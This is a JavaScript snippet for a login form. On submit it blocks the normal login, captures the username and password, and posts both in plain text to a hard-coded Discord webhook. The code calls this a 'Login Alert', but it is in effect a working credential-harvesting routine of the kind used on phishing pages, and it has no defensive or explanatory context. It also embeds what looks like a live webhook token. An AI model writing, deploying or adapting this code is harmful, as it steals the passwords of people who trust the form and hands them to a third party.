document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Discord webhook URL
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';

    // Prepare the payload to send to Discord
    const embed = {
        content: `${username}: has logged in with the password: ${password}`,
        embeds: [{
            title: 'Login Alert',
            description: `${username} has logged in.`,
            color: 0x00FF00,
        }],
    };

    // Send the data to the Discord webhook
    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(embed),
    });
});
